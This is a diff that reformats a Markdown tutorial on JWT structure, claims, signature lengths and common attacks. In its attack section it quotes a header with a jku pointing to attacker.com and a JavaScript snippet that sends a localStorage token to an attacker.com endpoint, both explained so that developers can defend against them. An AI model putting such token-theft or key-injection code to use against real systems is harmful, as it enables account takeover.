@@ -44,7 +44,7 @@ A JWT (JWS compact form) is SIGNED, NOT ENCRYPTED.
   ✓ Anyone with the token can READ the payload.
   ✓ Anyone with the verification key can VERIFY the signature.
   ✗ JWT does NOT keep the payload secret by default.
-  
+
 If you need confidentiality, you need JWE (covered in 1.5) or TLS
 on the wire. JWT alone is a postcard, not a sealed letter.
 ```
@@ -115,6 +115,7 @@ no padding on the base64
 ```
 
 You will see variations:
+
 - Some implementations pad with `=`. Both are valid Base64URL decoders.
 - Some implementations have line-wrapped JWS JSON serialization (not common for JWT, used in JWS more broadly).
 - Tokens may have a query-string or header prefix (`Bearer `, etc.) — that's the transport, not the token.
@@ -127,33 +128,33 @@ The JOSE header declares the algorithm and metadata. It MUST be a JSON object.
 
 ### Standard JOSE header fields
 
-| Field | Type | Required? | Meaning |
-|-------|------|-----------|---------|
-| `alg` | string | **Mandatory** | Algorithm used to sign/encrypt. MUST be in your verifier's allowlist. |
-| `typ` | string | Recommended | Media type. Almost always `"JWT"`. Sometimes `"at+jwt"` for OAuth 2.0 access tokens (RFC 9068). |
-| `kid` | string | Recommended when multiple keys | Key ID. Used by the verifier to pick the right key from a JWKS. |
-| `cty` | string | For nested tokens | Content type. `"JWT"` for a nested signed-then-encrypted token. |
-| `alg` (none) | — | NEVER | Some libraries recognize `"none"` to mean "no signature". See attacks. |
-| `x5t` | string | For cert-bound keys | X.509 SHA-1 thumbprint of the signing cert (legacy). |
-| `x5t#S256` | string | For cert-bound keys | X.509 SHA-256 thumbprint of the signing cert (modern). |
-| `x5u` | string | For cert chain | URL to X.509 cert chain. **Dangerous — see attacks.** |
-| `jku` | string | For key set | URL to JWK Set. **Dangerous — see attacks.** |
-| `crit` | array of strings | Extension marker | List of critical extensions the verifier MUST understand. |
-| `enc` | string | JWE only | Encryption algorithm for the content. |
-| `zip` | string | JWE only | Compression algorithm (`"DEF"` for zlib, sometimes). |
+| Field        | Type             | Required?                      | Meaning                                                                                         |
+| ------------ | ---------------- | ------------------------------ | ----------------------------------------------------------------------------------------------- |
+| `alg`        | string           | **Mandatory**                  | Algorithm used to sign/encrypt. MUST be in your verifier's allowlist.                           |
+| `typ`        | string           | Recommended                    | Media type. Almost always `"JWT"`. Sometimes `"at+jwt"` for OAuth 2.0 access tokens (RFC 9068). |
+| `kid`        | string           | Recommended when multiple keys | Key ID. Used by the verifier to pick the right key from a JWKS.                                 |
+| `cty`        | string           | For nested tokens              | Content type. `"JWT"` for a nested signed-then-encrypted token.                                 |
+| `alg` (none) | —                | NEVER                          | Some libraries recognize `"none"` to mean "no signature". See attacks.                          |
+| `x5t`        | string           | For cert-bound keys            | X.509 SHA-1 thumbprint of the signing cert (legacy).                                            |
+| `x5t#S256`   | string           | For cert-bound keys            | X.509 SHA-256 thumbprint of the signing cert (modern).                                          |
+| `x5u`        | string           | For cert chain                 | URL to X.509 cert chain. **Dangerous — see attacks.**                                           |
+| `jku`        | string           | For key set                    | URL to JWK Set. **Dangerous — see attacks.**                                                    |
+| `crit`       | array of strings | Extension marker               | List of critical extensions the verifier MUST understand.                                       |
+| `enc`        | string           | JWE only                       | Encryption algorithm for the content.                                                           |
+| `zip`        | string           | JWE only                       | Compression algorithm (`"DEF"` for zlib, sometimes).                                            |
 
 ### The `kid` field in detail
 
 ```
 Why kid matters:
-  
+
   An issuer has multiple signing keys (current + previous, rotating).
   A JWT signed with key 1 looks identical to one signed with key 2
   except for the signature bytes.
-  
+
   Without kid, the verifier has to try ALL keys until one verifies.
   With kid, the verifier looks up just the right key.
-  
+
   kid is also essential for JWKS rotation (covered in 1.5).
 ```
 
@@ -185,15 +186,15 @@ The payload is a JSON object. Each top-level key is a **claim** — a statement 
 
 ### 4.1 Registered claims (RFC 7519, Section 4.1)
 
-| Claim | Full name | Type | Required? | Meaning |
-|-------|-----------|------|-----------|---------|
-| `iss` | Issuer | string | **Mandatory** (in practice) | Who issued this token. URL of the IdP. |
-| `sub` | Subject | string | **Mandatory** (in practice) | The user (or entity) this token is about. Opaque ID, not an email. |
-| `aud` | Audience | string or array | **Mandatory** (in practice) | Who this token is intended for. The API that should accept it. |
-| `exp` | Expiration | number (Unix seconds) | **Mandatory** | After this time, the token is invalid. |
-| `nbf` | Not Before | number (Unix seconds) | Optional | Token is not valid before this time. |
-| `iat` | Issued At | number (Unix seconds) | Recommended | When the token was issued. |
-| `jti` | JWT ID | string | Optional | Unique identifier for this token. Used for replay protection / denylist. |
+| Claim | Full name  | Type                  | Required?                   | Meaning                                                                  |
+| ----- | ---------- | --------------------- | --------------------------- | ------------------------------------------------------------------------ |
+| `iss` | Issuer     | string                | **Mandatory** (in practice) | Who issued this token. URL of the IdP.                                   |
+| `sub` | Subject    | string                | **Mandatory** (in practice) | The user (or entity) this token is about. Opaque ID, not an email.       |
+| `aud` | Audience   | string or array       | **Mandatory** (in practice) | Who this token is intended for. The API that should accept it.           |
+| `exp` | Expiration | number (Unix seconds) | **Mandatory**               | After this time, the token is invalid.                                   |
+| `nbf` | Not Before | number (Unix seconds) | Optional                    | Token is not valid before this time.                                     |
+| `iat` | Issued At  | number (Unix seconds) | Recommended                 | When the token was issued.                                               |
+| `jti` | JWT ID     | string                | Optional                    | Unique identifier for this token. Used for replay protection / denylist. |
 
 **These three-letter names are short on purpose** — every byte counts when the token goes in a header or cookie.
 
@@ -201,32 +202,32 @@ The payload is a JSON object. Each top-level key is a **claim** — a statement 
 
 The IANA "JSON Web Token Claims" registry tracks additional standardized claim names. Some you'll meet:
 
-| Claim | Meaning |
-|-------|---------|
-| `name` | Full name |
-| `given_name` | First name |
-| `family_name` | Last name |
-| `middle_name` | Middle name |
-| `nickname` | Casual name |
-| `preferred_username` | Username (may be unique within the issuer) |
-| `profile` | URL to profile page |
-| `picture` | URL to avatar |
-| `website` | URL to website |
-| `email` | Email address |
-| `email_verified` | Boolean — has the email been verified? |
-| `gender` | Self-reported gender |
-| `birthdate` | ISO 8601 date string |
-| `zoneinfo` | IANA tz database name (`"America/Los_Angeles"`) |
-| `locale` | BCP47 language tag (`"en-US"`) |
-| `phone_number` | Phone number |
-| `phone_number_verified` | Boolean |
-| `address` | JSON object with formatted/street_address/etc. |
-| `updated_at` | Unix seconds — when the user's profile was last updated |
-| `auth_time` | Unix seconds — when the user last authenticated (for max_age) |
-| `acr` | Authentication Context Class Reference — what auth method was used |
-| `amr` | Authentication Methods References — array of methods used |
-| `azp` | Authorized Party — the client the token was issued to (when different from `aud`) |
-| `nonce` | String provided by the client to bind the response to the request |
+| Claim                   | Meaning                                                                           |
+| ----------------------- | --------------------------------------------------------------------------------- |
+| `name`                  | Full name                                                                         |
+| `given_name`            | First name                                                                        |
+| `family_name`           | Last name                                                                         |
+| `middle_name`           | Middle name                                                                       |
+| `nickname`              | Casual name                                                                       |
+| `preferred_username`    | Username (may be unique within the issuer)                                        |
+| `profile`               | URL to profile page                                                               |
+| `picture`               | URL to avatar                                                                     |
+| `website`               | URL to website                                                                    |
+| `email`                 | Email address                                                                     |
+| `email_verified`        | Boolean — has the email been verified?                                            |
+| `gender`                | Self-reported gender                                                              |
+| `birthdate`             | ISO 8601 date string                                                              |
+| `zoneinfo`              | IANA tz database name (`"America/Los_Angeles"`)                                   |
+| `locale`                | BCP47 language tag (`"en-US"`)                                                    |
+| `phone_number`          | Phone number                                                                      |
+| `phone_number_verified` | Boolean                                                                           |
+| `address`               | JSON object with formatted/street_address/etc.                                    |
+| `updated_at`            | Unix seconds — when the user's profile was last updated                           |
+| `auth_time`             | Unix seconds — when the user last authenticated (for max_age)                     |
+| `acr`                   | Authentication Context Class Reference — what auth method was used                |
+| `amr`                   | Authentication Methods References — array of methods used                         |
+| `azp`                   | Authorized Party — the client the token was issued to (when different from `aud`) |
+| `nonce`                 | String provided by the client to bind the response to the request                 |
 
 ### 4.3 Private claims (your application's domain)
 
@@ -265,10 +266,10 @@ Why this matters:
 ```
 Scenario: Alice signs up with alice@company.com
   sub = "alice@company.com"  ← THE BUG
-  
+
   Six months later, Alice leaves and her email is recycled.
   Bob joins, takes over alice@company.com.
-  
+
   Now Bob's access tokens have sub = "alice@company.com"
   Your RBAC code looks up "alice@company.com" → Bob's permissions.
   Alice's old audit trail is now Bob's identity. Compliance nightmare.
@@ -290,7 +291,7 @@ Common bug:
   Service B's verifier checks signature (passes — same IdP)
   Service B accepts the token
   User gets access to B's data through A's token
-  
+
 This is a confused-deputy attack. Always validate aud.
 ```
 
@@ -324,7 +325,7 @@ exp = int(time.time() * 1000)       # JWT spec says no, but some libs tolerate
 ```
 Verifier accepts: now() - leeway < exp
 Default leeway:   0 to 60 seconds
-  
+
 Don't go crazy with leeway:
   - 30s: normal (NTP-synced clocks drift ~10-50ms)
   - 60s: cautious
@@ -346,6 +347,7 @@ Why it matters:
 ```
 
 `jti` MUST be unique within the issuer's namespace for the lifetime of the token. Use:
+
 - UUIDv4: `550e8400-e29b-41d4-a716-446655440000`
 - ULID: `01ARZ3NDEKTSV4RRFFQ69G5FAV` (sortable, useful for log queries)
 - Random 16+ bytes hex-encoded
@@ -378,6 +380,7 @@ header_b64 + "." + payload_b64 + "." + signature_b64
 ```
 
 **Critical points (from Stage 0.2):**
+
 - The signing input is the literal ASCII bytes, not the decoded JSON.
 - The signature is binary → Base64URL-encoded.
 - The signing input is the SAME for the verifier (they don't re-parse the JSON, they verify the bytes).
@@ -386,18 +389,18 @@ header_b64 + "." + payload_b64 + "." + signature_b64
 **Lengths by algorithm:**
 
 | Algorithm | Signature length (raw bytes) | Base64URL length |
-|-----------|------------------------------|------------------|
-| HS256 | 32 | 43 |
-| HS384 | 48 | 64 |
-| HS512 | 64 | 86 |
-| RS256 | 256 | 342 |
-| RS384 | 256 | 342 |
-| RS512 | 256 | 342 |
-| PS256 | 256 | 342 |
-| ES256 | 64 | 86 |
-| ES384 | 96 | 128 |
-| ES512 | 132 | 176 |
-| EdDSA | 64 | 86 |
+| --------- | ---------------------------- | ---------------- |
+| HS256     | 32                           | 43               |
+| HS384     | 48                           | 64               |
+| HS512     | 64                           | 86               |
+| RS256     | 256                          | 342              |
+| RS384     | 256                          | 342              |
+| RS512     | 256                          | 342              |
+| PS256     | 256                          | 342              |
+| ES256     | 64                           | 86               |
+| ES384     | 96                           | 128              |
+| ES512     | 132                          | 176              |
+| EdDSA     | 64                           | 86               |
 
 ---
 
@@ -491,15 +494,15 @@ Signature valid: True
 
 JWT is an overloaded term. Here are the variants you'll meet:
 
-| Format | Spec | Signed? | Encrypted? | Notes |
-|--------|------|---------|------------|-------|
-| **JWS compact** | RFC 7515 | Yes | No | What most people call "JWT". `header.payload.sig`. |
-| **JWS JSON** | RFC 7515 | Yes | No | One or more signatures, JSON-wrapped. Less common. |
-| **JWE compact** | RFC 7516 | Yes (inner) | Yes (outer) | 5 parts: `header.encrypted_key.iv.ciphertext.tag`. |
-| **JWE JSON** | RFC 7516 | Yes | Yes | JSON-wrapped, more flexibility. |
-| **CWT** | RFC 8392 | Yes | Optional | CBOR-encoded. For IoT/constrained devices. |
-| **PASETO** | Platform-Agnostic SEcurity TOkens | Yes | Optional | Designed to fix JWT's footguns by removing `alg` choice. |
-| **SD-JWT** | RFC 9901 | Yes | No | Selective Disclosure JWT — pick which claims to reveal. |
+| Format          | Spec                              | Signed?     | Encrypted?  | Notes                                                    |
+| --------------- | --------------------------------- | ----------- | ----------- | -------------------------------------------------------- |
+| **JWS compact** | RFC 7515                          | Yes         | No          | What most people call "JWT". `header.payload.sig`.       |
+| **JWS JSON**    | RFC 7515                          | Yes         | No          | One or more signatures, JSON-wrapped. Less common.       |
+| **JWE compact** | RFC 7516                          | Yes (inner) | Yes (outer) | 5 parts: `header.encrypted_key.iv.ciphertext.tag`.       |
+| **JWE JSON**    | RFC 7516                          | Yes         | Yes         | JSON-wrapped, more flexibility.                          |
+| **CWT**         | RFC 8392                          | Yes         | Optional    | CBOR-encoded. For IoT/constrained devices.               |
+| **PASETO**      | Platform-Agnostic SEcurity TOkens | Yes         | Optional    | Designed to fix JWT's footguns by removing `alg` choice. |
+| **SD-JWT**      | RFC 9901                          | Yes         | No          | Selective Disclosure JWT — pick which claims to reveal.  |
 
 **JWS compact (the common case):**
 
@@ -520,10 +523,10 @@ The JWE header carries `alg` (key wrap), `enc` (content encryption), `kid`, etc.
 ```
 PASETO removes the algorithm choice. Each version pins an algorithm.
 No `alg` header. No algorithm confusion attacks possible by design.
-  
+
 v4.local. (symmetric, encrypted)
 v4.public. (asymmetric, signed)
-  
+
 Tradeoff: less interoperability (every language has JWT libs, fewer have PASETO).
 Use JWT unless you have a specific reason for PASETO.
 ```
@@ -701,18 +704,18 @@ print(f"Valid: {claims['sub']}")
 
 Imagine a corporate office with a visitor management system.
 
-| JWT concept | Office equivalent |
-|-------------|-------------------|
-| **Issuer (`iss`)** | The security desk that printed the badge |
-| **Subject (`sub`)** | The visitor's employee ID (NOT their name — name can change) |
-| **Audience (`aud`)** | The specific floor/room the badge grants access to |
-| **Expiration (`exp`)** | The "VALID UNTIL" date printed on the badge |
-| **Issued At (`iat`)** | The "ISSUED" date |
-| **JWT ID (`jti`)** | The unique serial number on the badge |
-| **Header `kid`** | The printer's batch number (lets you know which master template to verify against) |
-| **Signature** | The hologram on the badge — tamper-evident, copy-resistant |
-| **Payload** | Everything printed on the badge in plain text |
-| **Encryption (JWE)** | A sealed envelope the badge is delivered in |
+| JWT concept            | Office equivalent                                                                  |
+| ---------------------- | ---------------------------------------------------------------------------------- |
+| **Issuer (`iss`)**     | The security desk that printed the badge                                           |
+| **Subject (`sub`)**    | The visitor's employee ID (NOT their name — name can change)                       |
+| **Audience (`aud`)**   | The specific floor/room the badge grants access to                                 |
+| **Expiration (`exp`)** | The "VALID UNTIL" date printed on the badge                                        |
+| **Issued At (`iat`)**  | The "ISSUED" date                                                                  |
+| **JWT ID (`jti`)**     | The unique serial number on the badge                                              |
+| **Header `kid`**       | The printer's batch number (lets you know which master template to verify against) |
+| **Signature**          | The hologram on the badge — tamper-evident, copy-resistant                         |
+| **Payload**            | Everything printed on the badge in plain text                                      |
+| **Encryption (JWE)**   | A sealed envelope the badge is delivered in                                        |
 
 **The flow:**
 
@@ -806,7 +809,7 @@ Mitigations:
 
 ```
 Token header: {"alg":"RS256","jku":"https://attacker.com/keys.json"}
-  
+
   Buggy library: fetches jku, uses the keys there to verify.
   Attacker: hosts their own public key, signs tokens with the matching private key.
   All forged tokens verify. Game over.
@@ -822,7 +825,7 @@ Mitigations:
 ```
 If the verifier loops over all keys in the JWKS looking for one that
 verifies, and an attacker can add a key to the JWKS:
-  
+
 Attacker hosts a key at a URL the verifier might fetch
 Attacker sets kid in their forged token to match
 Verifier fetches the attacker's key
@@ -873,13 +876,13 @@ Mitigations:
 Some apps use sub for the user ID. If sub is missing:
   sub = None
   user_id = None
-  
+
   The code does: db.query("SELECT * FROM users WHERE id = ?", user_id)
   SQL injection? Probably not (parameterized), but the query returns
   "no user found" → 404.
-  
+
   OR: code does user_id = payload.get("sub", "admin")
-  
+
   Now tokens without sub get user_id = "admin".
   Game over.
 ```
@@ -902,10 +905,10 @@ IdP has 3 signing keys (rotating).
 Your verifier fetches JWKS, gets 3 keys.
 Token has kid = "key-2".
 Your code does: for key in jwks.keys: verify(token, key)
-  
+
   → Tries key-1: fails
   → Tries key-2: succeeds
-  
+
 Fine. But: linear search is O(n). With 10 keys, 10x slower.
 With 100 keys (paranoid rotation schedule), 100x slower.
 With 1000 keys (compromise recovery), 1000x slower.
@@ -921,13 +924,13 @@ the #1 way JWTs get stolen.
 
 If ANY script on your page has an XSS bug (or if you load a
 compromised npm package), the attacker does:
-  
+
   const token = localStorage.getItem('jwt');
   fetch('https://attacker.com/steal', {
     method: 'POST',
     body: JSON.stringify({ token })
   });
-  
+
   Game over for that user.
 
 Mitigations: see Stage 5.2. The TL;DR: store access tokens in memory,
@@ -939,11 +942,11 @@ refresh tokens in HttpOnly cookies.
 ```
 Pattern: User clicks "forgot password", gets an email with a link
   https://app.example.com/reset?token=eyJ...
-  
-JWT in URL → email is plain text in transit (unless S/MIME) → 
+
+JWT in URL → email is plain text in transit (unless S/MIME) →
 JWT ends up in mail server logs, browser history, anywhere the
 email is forwarded.
-  
+
 Use a one-time opaque token (random 32 bytes, base64) for magic links.
 The server maps opaque_token → reset_action in its database.
 ```
@@ -953,41 +956,54 @@ The server maps opaque_token → reset_action in its database.
 ## 12. Exercises
 
 ### Exercise 1: Decode a real JWT from your environment
+
 Take a token from any OIDC provider you've used (Google, GitHub, Auth0, your Keycloak, whatever). Decode header and payload by hand (no library). Identify: `alg`, `iss`, `sub`, `aud`, `exp` (in human time), `iat` (in human time), any custom claims.
 
 ### Exercise 2: Predict the signature length
+
 For each algorithm, predict the Base64URL-encoded signature length: HS256, HS512, RS256, ES256, EdDSA. Verify by signing tokens in your language of choice.
 
 ### Exercise 3: Two-issuer audit
+
 You have two services: `api-a` and `api-b`. Both accept tokens from the same IdP. A user authenticates to `api-a` and gets a token with `aud=api-a`. They paste the token into a request to `api-b`. Does `api-b` accept it? Why or why not? What's the fix?
 
 ### Exercise 4: Build a JWT by hand
+
 Without looking at Section 8, write 30 lines of Python that:
+
 - Takes a payload dict + key bytes
 - Returns a signed HS256 JWT
 - Has the exact same output as PyJWT for the same inputs
 
 ### Exercise 5: Custom claim namespace
+
 Design a custom claims schema for a multi-tenant SaaS app with: user roles, organization ID, feature flags, subscription tier. Use URI namespacing. Justify the URI choice.
 
 ### Exercise 6: The `kid` decision
+
 Your IdP has 1 signing key today, but you're planning a 90-day rotation. Should you add `kid` to the header now? Why? What happens during the rotation if you don't?
 
 ### Exercise 7: Decode a JWE
+
 Find a JWE-format token (most OIDC ID tokens are JWS, not JWE, but encrypted JWTs exist for things like `at+jwt` with `cnf` claims, or for SAML-to-JWT bridges). Decode the 5 parts. Which one is the IV? Which one is the auth tag? Which one is the encrypted key?
 
 ### Exercise 8: 5 fields, 5 meanings
+
 A friend asks you "what's in a JWT?" — list the 5 most important fields and explain each in one sentence. Time yourself: under 60 seconds.
 
 ### Exercise 9: LocalStorage vs HttpOnly
+
 Build a 30-line SPA (vanilla JS, no framework) that:
+
 - (a) Stores a JWT in localStorage and uses it for API calls
 - (b) Stores the JWT in memory, uses a refresh token in an HttpOnly cookie
 
 For each, identify the XSS impact (i.e., what can an XSS attacker do?). Compare.
 
 ### Exercise 10: Audit your tokens
+
 For every JWT in your current systems (if you have any):
+
 - How long is the access token's lifetime?
 - Does it carry sensitive PII?
 - Where is it stored (cookie / localStorage / memory)?
@@ -1005,6 +1021,7 @@ You can now read, write, and reason about any JWT. Next, we go deeper on the alg
 → [[../stage1/02-algorithms|Stage 1.2 — JWT Algorithms: HS/RS/ES/PS/EdDSA]]
 
 **Before you move on, verify you can answer these:**
+
 1. What are the three parts of a JWT, and what's the exact input to the signature?
 2. What's the difference between `sub` and `email`? Why does `sub` need to be opaque?
 3. What is `kid`, and why is it essential for JWKS rotation?
